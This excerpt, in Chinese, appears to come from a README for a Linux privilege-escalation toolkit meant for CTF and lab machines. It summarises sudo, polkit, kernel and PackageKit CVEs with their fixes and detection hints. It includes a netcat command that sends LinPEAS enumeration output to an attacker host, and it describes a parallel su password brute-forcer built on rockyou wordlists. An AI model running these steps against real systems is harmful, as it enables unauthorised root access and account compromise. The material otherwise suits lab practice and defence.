...
├── linpeas.sh                 # LinPEAS 本地枚举（最新版）
├── lin2026.sh                 # 轻量 Linux 枚举脚本（ng 版）
...
**修复**：升级至包含 commit `a664bf3d603d` 的内核版本或发行版安全补丁。
...
**影响内核**：5.8 ~ 5.16.11 / 5.15.25 / 5.10.102（三条稳定分支同步修复）
...
**修复**：升级内核至 5.16.11 / 5.15.25 / 5.10.102 及以上。
...
**影响范围**：几乎所有安装了 polkit 的 Linux 系统（Ubuntu、Debian、Fedora、CentOS 等）  
**CVSS**：7.8 (HIGH)
...
```bash
sudo chmod 0755 /usr/bin/pkexec  # 去除 SUID bit
```

**修复**：升级 polkit 至发行版安全更新版本。
...
**修复**：升级 sudo 至修复版本，或在 sudoers 中禁用 `-R` 选项。
...
**修复 commit**：`76cfb675`（pk-transaction.c 中添加状态守卫）
...
- 同一事务对象路径上的多次快速 `InstallFiles` 调用
- 非 root 进程在 `/tmp` 下创建 `.deb`/`.rpm` 文件
- `packagekitd` 执行源自 `/tmp` 的 postinst/post 脚本

**修复**：升级 PackageKit 至 ≥ 1.3.5。
...
**漏洞概述**  
sudo 在解析命令行时，对 `\` 转义字符处理不当导致**堆缓冲区溢出**，无需 sudo 权限的本地用户即可利用漏洞提权到 root。该漏洞影响 sudo 1.8.2 ~ 1.8.31p2 及 1.9.0 ~ 1.9.5p1，存在约 10 年。

**影响范围**：Ubuntu 20.04 / 18.04 / 16.04 / 14.04、Debian 10 / 9、Fedora、CentOS 8/7/6 等  
**CVSS**：7.8 (HIGH)
...
**修复**：升级 sudo 至 1.8.32 / 1.9.5p2 及以上。
...
# 上传后赋权运行（靶机无需联网）
chmod +x linpeas.sh
./linpeas.sh 2>/dev/null | tee /tmp/lp.txt

# 直接回显到 kali（在 kali 上监听）
nc -lvnp 9001
# 靶机执行：
./linpeas.sh | nc <KALI_IP> 9001
```

### lin2026.sh

轻量级枚举脚本（ng 版），特别适合资源受限或不希望产生大量噪声的场景。
...
按需选择规模，字典条目均来自 rockyou.txt 原始排序（按出现频率降序）。
...
在已有低权限 shell 时，利用字典对 `su` 命令进行本地密码爆破，无需 SSH。并发执行（每 16 个并行），速度较 `su` 串行调用提升明显。
...
> **注意**：`su` 通常有登录失败延迟（PAM tally），建议在 CTF / 靶机环境使用，生产环境会触发账号锁定告警。
